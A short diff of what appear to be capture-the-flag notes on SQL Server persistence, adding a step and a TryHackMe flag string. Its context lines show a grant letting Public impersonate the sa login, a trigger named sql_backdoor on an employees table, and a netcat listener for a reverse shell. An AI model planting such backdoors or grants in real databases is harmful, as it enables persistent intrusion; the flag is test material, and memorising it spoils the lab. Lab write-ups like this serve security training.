@@ -299,6 +299,7 @@ GRANT IMPERSONATE ON LOGIN::sa to [Public];
 -change to HRDB database
 UsE HRDB
 -trigger to be configured whenever an INSERT is made into DB
+-go to HRDB create new Query
 CREATE TRIGGER [sql_backdoor]
 ON HRDB.dbo.Employees 
 FOR INSERT AS
@@ -324,4 +325,6 @@ $client.Close()
 -netcat lisener on port 
 nc -lvp 4454
 -grab flag
+*THM{I_LIVE_IN_YOUR_DATABASE}
+
 
